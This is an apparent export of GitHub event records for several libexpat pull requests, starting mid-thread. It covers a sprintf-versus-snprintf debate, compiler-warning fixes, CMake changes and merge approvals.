Hmmm, strange.  We are invoking it differently though. I'm using CMake's `CMAKE_EXPORT_COMPILE_COMMANDS=ON` to generate `compile_commands.json` and then passing `--project=compile_commands.json` to cppcheck.  I guess that's somehow the difference...

>We don't agree on that then.

*If the return value is unneeded (like in libexpat)*, when is `sprintf` preferable to `snprintf`?  I honestly cannot think of any situation.

","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292648552"", ""author_association"": ""CONTRIBUTOR""}"
669,IssueCommentSupplement,2022-10-26 23:44:05,hartwork,fork_merge,">>> There is no such thing as safe use of `sprintf`. :)  It's just too easy to overrun a buffer.  `sprintf` should ***never*** be used.

>>    We don't agree on that then.

> [..], when is `sprintf` preferable to `snprintf`? I honestly cannot think of any situation.

@seanm you said above there is no safe way to use `sprintf`… but all uses of `sprintf` we just patched in this pull request were perfectly safe, already. ""Preferable"" might by arguable or taste, but there was no issue to be fixed here, any warning about it had no point beyond _general awareness_, on these very cases.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292780631"", ""author_association"": ""MEMBER""}"
669,IssueCommentSupplement,2022-10-27 13:15:17,RMJ10,fork_merge,">       * warning  `DUMMY_DEFAULT_HANDLER_FLAG` — technically unused, may need a line `dummy_handler_flags |= DUMMY_DEFAULT_HANDLER_FLAG` at the end of function `dummy_default_handler`.  Three more functions need a closer look (or a maybe comment) for the same thing:
>         
>         * `dummy_xdecl_handler`
>         * `dummy_end_element`
>         * `dummy_cdata_handler`

I think `DUMMY_DEFAULT_HANDLER_FLAG` may have got added on the assumption that it was needed for a test.

The purpose of the dummy handlers, as the comment says, is to provide a handler when we need one but don't care what it does.  Setting flags to prove the handler has been run is extra to that, so not having a flag set by those three functions isn't wrong.  It's safe to delete the definition of `DUMMY_DEFAULT_HANDLER_FLAG` and for now it's probably the right answer.

Strictly speaking we should probably have a bunch of really basic tests that check the handlers do fire when they're supposed to, but so many other tests would fail if they didn't that it's not really worth while to do that.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1293511042"", ""author_association"": ""CONTRIBUTOR""}"
669,IssueCommentSupplement,2022-10-27 14:50:16,hartwork,fork_merge,@RMJ10 thanks for jumping in and the elaboration. Summary note to myself: It's sound to drop the `DUMMY_DEFAULT_HANDLER_FLAG` macro.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1293642291"", ""author_association"": ""MEMBER""}"
669,IssueCommentSupplement,2022-10-27 18:25:54,seanm,fork_merge,">you said above there is no safe way to use sprintf…

OK, I guess that way maybe a little too strong. I suppose use of `sprintf` can sometimes have no bugs.

>but all uses of sprintf we just patched in this pull request were perfectly safe, already.

Honestly, I didn't even check.  But checking now, it was easy to find at least one was buggy:

```
static void
_xml_failure(XML_Parser parser, const char *file, int line) {
  char buffer[1024];
  enum XML_Error err = XML_GetErrorCode(parser);
  sprintf(buffer,
          ""    %d: %"" XML_FMT_STR "" (line %"" XML_FMT_INT_MOD
          ""u, offset %"" XML_FMT_INT_MOD ""u)\n    reported from %s, line %d\n"",
          err, XML_ErrorString(err), XML_GetCurrentLineNumber(parser),
          XML_GetCurrentColumnNumber(parser), file, line);
  _fail_unless(0, file, line, buffer);
}
```

The `file` path parameter could easily be more than ~900 characters, and overflow the 1024 byte buffer.

>""Preferable"" might by arguable or taste, but there was no issue to be fixed here, any warning about it had no point beyond general awareness, on these very cases.

""Preferable"" is too weak. I maintain that there is never a good reason to choose `sprintf` instead of `snprintf`.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1293906989"", ""author_association"": ""CONTRIBUTOR""}"
669,IssueCommentSupplement,2022-10-27 18:45:54,hartwork,fork_merge,"> > you said above there is no safe way to use sprintf…
> 
> OK, I guess that way maybe a little too strong. I suppose use of `sprintf` can sometimes have no bugs.

@seanm thanks for saying that.

> > but all uses of sprintf we just patched in this pull request were perfectly safe, already.
> 
> Honestly, I didn't even check. But checking now, it was easy to find at least one was buggy:
> 
> ```
> static void
> _xml_failure(XML_Parser parser, const char *file, int line) {
>   char buffer[1024];
>   enum XML_Error err = XML_GetErrorCode(parser);
>   sprintf(buffer,
>           ""    %d: %"" XML_FMT_STR "" (line %"" XML_FMT_INT_MOD
>           ""u, offset %"" XML_FMT_INT_MOD ""u)\n    reported from %s, line %d\n"",
>           err, XML_ErrorString(err), XML_GetCurrentLineNumber(parser),
>           XML_GetCurrentColumnNumber(parser), file, line);
>   _fail_unless(0, file, line, buffer);
> }
> ```
> 
> The `file` path parameter could easily be more than ~900 characters, and overflow the 1024 byte buffer.

There is potentially no such case in the code base given that all calls to `_xml_failure` come from hard-coded tests and use the value of `__FILE__` most or all of the time, but you have a point nonetheless.
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1293928009"", ""author_association"": ""MEMBER""}"
670,OpenPR,2022-10-26 17:26:53,seanm,fork_merge,,
670,IssueComment,2022-10-26 17:27:42,seanm,fork_merge,"This fixes all the easy `Wcast-qual` warnings.  Fixing the remaining ones requires someone that knows the codebase well, and may require APi changes too.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292373016"", ""author_association"": ""CONTRIBUTOR""}"
670,ReviewRejected,2022-10-26 17:43:38,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1157015289""}"
670,RenameTitle,2022-10-26 18:50:30,hartwork,fork_merge,,"{""rename"": {""from"": ""Fixed some clang -Wcast-qual warnings"", ""to"": ""Fix some -Wcast-qual Clang warnings""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7675508895""}"
670,Labeled,2022-10-26 18:50:49,hartwork,fork_merge,enhancement,
670,HeadRefForcePushed,2022-10-26 19:36:26,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7675879308"", ""commit_url"": null}"
670,HeadRefForcePushed,2022-10-27 18:30:27,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7684863714"", ""commit_url"": null}"
670,IssueComment,2022-10-27 18:40:14,seanm,fork_merge,"I've fixed a few more const warnings since first creating this PR, but now I think I'm done.  Some remain, but they are non-trivial, at least for me.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1293922297"", ""author_association"": ""CONTRIBUTOR""}"
670,ReviewRejected,2022-11-01 20:32:34,hartwork,fork_merge,"@seanm reviewed in detail now, please see comments below","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1163933946""}"
670,Revise,2022-11-01 21:20:26,seanm,fork_merge,"Fixed some -Wcast-qual warnings by just using NULL for default value of output param

The `endptr` parameter of both tcstof() and strtoul() are output-only; its initial value is not read, and so may as well be NULL.","{""sha"": ""fc594f380dd766ee363c44395b46f843465ac679"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-27T17:34:55Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-11-01T21:20:26Z""}}"
670,IssueComment,2022-11-01 22:01:21,hartwork,fork_merge,"@seanm could it be that no all changes marked ""Done."" have been pushed yet? Is this your most recent copy?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1299283607"", ""author_association"": ""MEMBER""}"
670,HeadRefForcePushed,2022-11-01 22:20:42,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7717630559"", ""commit_url"": null}"
670,IssueComment,2022-11-01 22:22:47,seanm,fork_merge,"> @seanm could it be that no all changes marked ""Done."" have been pushed yet? Is this your most recent copy?

Sorry, I tried to push simultaneously to my comments, but turns out my github ""personal access token"" just expired and I just spent 30 f*#$ing minutes trying to get that working again.  New changes pushed now.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1299304234"", ""author_association"": ""CONTRIBUTOR""}"
670,ReviewRejected,2022-11-01 22:26:00,hartwork,fork_merge,@seanm thanks for the adjustments! :+1: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1164127897""}"
670,IssueComment,2022-11-01 22:28:16,hartwork,fork_merge,PS: @seanm did you see script `apply-clang-format.sh`?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1299308679"", ""author_association"": ""MEMBER""}"
670,IssueComment,2022-11-01 22:35:46,seanm,fork_merge,"> PS: @seanm did you see script `apply-clang-format.sh`?

Yes, alas my clang-format is segfaulting for some files, notably xmltok.c.  I'll get the formatting fixed tho...","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1299314198"", ""author_association"": ""CONTRIBUTOR""}"
670,HeadRefForcePushed,2022-11-01 22:42:14,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7717734729"", ""commit_url"": null}"
670,ReviewRejected,2022-11-01 22:47:09,hartwork,fork_merge,"@seanm I think after one last round of formatting fixes we're close to merge :+1: Maybe pulling the `re-use SB_BYTE_TYPE macro` changes into a separate commit (as those fix warnings as a side effect) would be optional icing on the cake, if you like.","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1164146833""}"
670,Revise,2022-11-01 22:54:12,seanm,fork_merge,"Fixed some clang -Wcast-qual warnings

Mostly added various missing consts, thus eliminating the casting away of constness. In a few cases, just removed unnecessary casts entirely.","{""sha"": ""c094e450a136ffdf4d3e128588b615008a35489e"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T00:53:23Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-11-01T22:54:12Z""}}"
670,HeadRefForcePushed,2022-11-01 22:54:25,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7717807519"", ""commit_url"": null}"
670,ReviewRejected,2022-11-02 15:55:52,hartwork,fork_merge,@seanm do you have a minute to push the [last fix needed](https://github.com/libexpat/libexpat/actions/runs/3373489414/jobs/5598106575#step:6:120) for clang-format?,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1165554872""}"
670,HeadRefForcePushed,2022-11-02 16:08:27,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7724999066"", ""commit_url"": null}"
670,IssueComment,2022-11-02 16:13:34,hartwork,fork_merge,@seanm one last at https://github.com/libexpat/libexpat/actions/runs/3379193047/jobs/5610426312#step:6:122,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1300798601"", ""author_association"": ""MEMBER""}"
670,Revise,2022-11-02 16:17:18,seanm,fork_merge,"Simplify code by using SB_BYTE_TYPE macro

This also fixes -Wcast-qual warnings, which was the original motivation.","{""sha"": ""cb7f93922e9fcc6d5fd62ee00e6223a70557208c"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-11-01T22:51:37Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-11-02T16:17:18Z""}}"
670,HeadRefForcePushed,2022-11-02 16:17:30,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7725087988"", ""commit_url"": null}"
670,ReviewApproved,2022-11-02 16:20:32,hartwork,fork_merge,"@seanm beautiful, thank you! :+1: ","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/670#pullrequestreview-1165600987""}"
670,Assigned,2022-11-02 16:21:14,hartwork,fork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
670,MergePR,2022-11-02 17:15:14,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7725592754"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/41c9daa3374892f2dcf04f63c3cb1b4eea054e1b""}"
670,IssueCommentSupplement,2022-11-02 18:59:11,seanm,fork_merge,"Thanks for the review and merge.

With AppleClang 13, the codebase now builds with no warnings with:

`-Weverything -Wno-padded -Wno-conversion -Wno-sign-conversion -Wno-switch-enum -Wno-unreachable-code -Wno-float-equal -Wno-missing-noreturn -Wno-unused-macros -Wno-disabled-macro-expansion -Wno-covered-switch-default -Wno-cast-qual`","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1301084256"", ""author_association"": ""CONTRIBUTOR""}"
671,OpenPR,2022-10-26 19:39:15,seanm,fork_merge,,
671,ReviewComment,2022-10-26 19:41:47,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/671#pullrequestreview-1157182380""}"
671,CrossReferenced,2022-10-26 19:42:14,seanm,fork_merge,Fix some -Wcast-qual Clang warnings,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/670"", ""is_pull_request"": true}}"
671,ReviewApproved,2022-10-26 20:16:03,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/671#pullrequestreview-1157228143""}"
671,RenameTitle,2022-10-26 20:16:45,hartwork,fork_merge,,"{""rename"": {""from"": ""Fixed getDebugLevel handling of empty env var"", ""to"": ""lib: Fix getDebugLevel handling of empty environment variable value""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7676218363""}"
671,Labeled,2022-10-26 20:16:51,hartwork,fork_merge,enhancement,
671,RenameTitle,2022-10-26 20:31:39,hartwork,fork_merge,,"{""rename"": {""from"": ""lib: Fix getDebugLevel handling of empty environment variable value"", ""to"": ""Fix getDebugLevel handling of empty environment variable value""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7676351225""}"
671,Revise,2022-10-27 18:02:44,seanm,fork_merge,"Fixed getDebugLevel handling of empty env var

Reformulated strtoul() error checking to also check if the returned 'afterValue' is set to the beginning of the input sting, which indicates that there were no digits at all.","{""sha"": ""1f7a7818841a417651265fd965ad3412c7e0a9cb"", ""author"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-22T02:15:43Z""}, ""committer"": {""name"": ""Sean McBride"", ""email"": ""sean@rogue-research.com"", ""date"": ""2022-10-27T18:02:44Z""}}"
671,HeadRefForcePushed,2022-10-27 18:03:18,seanm,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7684684654"", ""commit_url"": null}"
671,ReviewApproved,2022-10-27 19:22:32,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/671#pullrequestreview-1158931212""}"
671,MergePR,2022-10-27 19:22:42,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7685224497"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7ca7dbe24a12a96bac16d1a7dbdb6796d992603e""}"
672,SubmitCommit,2022-10-26 23:41:33,neheb,fork_merge,"cmake: lowercase off_t and size_t

Because of a bug in meson, defines need to be the same case.

Signed-off-by: Rosen Penev <rosenp@gmail.com>","{""sha"": ""917e5db3b1acf216daf3850eb803116fd744b73d"", ""author"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-10-26T23:41:33Z""}, ""committer"": {""name"": ""Rosen Penev"", ""email"": ""rosenp@gmail.com"", ""date"": ""2022-10-26T23:41:33Z""}}"
672,OpenPR,2022-10-26 23:43:02,neheb,fork_merge,,
672,IssueComment,2022-10-26 23:43:20,neheb,fork_merge,ping @chrishecker,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292780239"", ""author_association"": ""CONTRIBUTOR""}"
672,ReviewComment,2022-10-26 23:46:32,hartwork,fork_merge,"Hi @neheb could you share links to a description of the bug in meson in more detail? Also, which versions of meson are affected? Is this fixed upstream?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/672#pullrequestreview-1157413799""}"
672,RenameTitle,2022-10-26 23:47:26,hartwork,fork_merge,,"{""rename"": {""from"": ""cmake: lowercase off_t and size_t"", ""to"": ""CMake: Lowercase off_t and size_t""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7677492312""}"
672,IssueComment,2022-10-26 23:48:21,neheb,fork_merge,"https://github.com/mesonbuild/wrapdb/issues/708

probably all versions.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1292782828"", ""author_association"": ""CONTRIBUTOR""}"
672,MergePR,2022-11-01 19:21:44,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7716487955"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/a43efacb1b95b47801f28b6965847819fb58243b""}"
672,Labeled,2022-11-01 19:21:51,hartwork,fork_merge,enhancement,
672,DeleteBranch,2022-11-01 20:21:21,neheb,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7716898922"", ""commit_url"": null}"
673,SubmitCommit,2022-10-30 16:54:48,hartwork,unfork_merge,"examples: Clone example ""examples"" to ""element_declarations""","{""sha"": ""6b53a8de82088f00e8d7f19831a84a8a61447a05"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:35:52Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T16:54:48Z""}}"
673,SubmitCommit,2022-10-30 17:10:42,hartwork,unfork_merge,examples/element_declarations.c: Handle element declarations rather than elements,"{""sha"": ""7483d04a189694cd2e31cdce501f2366606ff221"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T00:59:22Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T17:10:42Z""}}"
673,SubmitCommit,2022-10-30 17:11:06,hartwork,unfork_merge,examples/element_declarations.c: Resolve recursion,"{""sha"": ""48bc51fcf118a6c7441f42f00ae9e2bb7dce848c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T16:44:32Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T17:11:06Z""}}"
673,SubmitCommit,2022-10-30 17:11:07,hartwork,unfork_merge,Sync file headers,"{""sha"": ""59fea9dd51aeda939912b1206d7ba1ffdab8b3cd"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T16:43:10Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-30T17:11:07Z""}}"
673,Labeled,2022-10-30 18:46:12,hartwork,unfork_merge,enhancement,
673,OpenPR,2022-10-30 18:46:12,hartwork,unfork_merge,,
673,CrossReferenced,2022-10-30 20:37:24,hartwork,unfork_merge,Fuzzer,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/617"", ""is_pull_request"": true}}"
673,Revise,2022-11-01 20:44:22,hartwork,unfork_merge,cmake: Resolve duplication related to building examples,"{""sha"": ""ad697455cbc217bb053de1036156c7ca22150657"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-01T20:43:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-01T20:44:22Z""}}"
673,Revise,2022-11-01 20:46:01,hartwork,unfork_merge,Changes: Document #673,"{""sha"": ""e924330f98ef454f5ce2e294c72dd814cb96b4d8"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-01T20:46:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-01T20:46:01Z""}}"
673,MergePR,2022-11-01 22:51:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7717794678"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d4373f337f69a0fefdb3e4bfc76668bdaa3e27d9""}"
673,DeleteBranch,2022-11-04 17:07:29,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7742566661"", ""commit_url"": null}"
675,SubmitCommit,2022-11-04 17:38:49,hartwork,unfork_merge,"coverage.yml: Drop ppa:ondrej/php removal

.. because image ubuntu-22.04 just stopped adding repository ppa:ondrej/php.
Related commit:
https://github.com/actions/runner-images/commit/cc71c8b504a5efec7d25054a016dbe7f34553df4","{""sha"": ""6c4749f3957712659ec1563a4191f50c162e8a90"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-04T17:13:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-11-04T17:38:49Z""}}"
675,OpenPR,2022-11-04 17:39:43,hartwork,unfork_merge,,
675,MergePR,2022-11-04 19:29:52,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7743429968"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/441f98d02deafd9b090aea568282b28f66a50e36""}"
675,DeleteBranch,2022-11-07 00:30:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7748234063"", ""commit_url"": null}"
